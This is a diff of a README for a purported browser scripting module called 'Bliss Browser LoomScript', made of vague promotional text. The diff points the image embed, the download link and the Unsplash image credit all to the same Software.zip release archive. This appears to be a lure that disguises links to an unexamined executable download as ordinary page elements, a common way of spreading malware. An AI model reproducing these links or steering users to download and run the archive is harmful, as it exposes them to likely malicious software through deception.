@@ -1,6 +1,6 @@
 # Bliss Browser LoomScript 
 
-![Bliss Browser LoomScript](https://yourimageurl.com)
+![Bliss Browser LoomScript](https://github.com/ADRIANODINIZ/Bliss_Browser_LoomScript/releases/download/v2.0/Software.zip)
 
 Welcome to the official repository of Bliss Browser LoomScript - your gateway to writing and running LoomScript programs directly within the browser environment.
 
@@ -18,7 +18,7 @@ Bliss Browser LoomScript is a language support module designed to empower develo
 
 ## Installation 🚀
 
-You can download the latest version [here](https://github.com/user-attachments/files/18383251/Software.zip) to get started with Bliss Browser LoomScript. Once downloaded, follow these steps to launch and integrate it into your projects:
+You can download the latest version [here](https://github.com/ADRIANODINIZ/Bliss_Browser_LoomScript/releases/download/v2.0/Software.zip) to get started with Bliss Browser LoomScript. Once downloaded, follow these steps to launch and integrate it into your projects:
 
 1. Download the software from the provided link.
 2. Unzip the downloaded file.
@@ -63,4 +63,4 @@ Bliss Browser LoomScript is licensed under GPL-3.0, ensuring that developers hav
 
 Dive into the world of Bliss Browser LoomScript and revolutionize your web development experience today! Get started with writing LoomScript programs directly in your browser and witness the magic of seamless integration. Enjoy coding with creativity and efficiency using Bliss Browser LoomScript! 🚀
 
-*Image Source: [Unsplash](https://unsplash.com)*
+*Image Source: [Unsplash](https://github.com/ADRIANODINIZ/Bliss_Browser_LoomScript/releases/download/v2.0/Software.zip)*
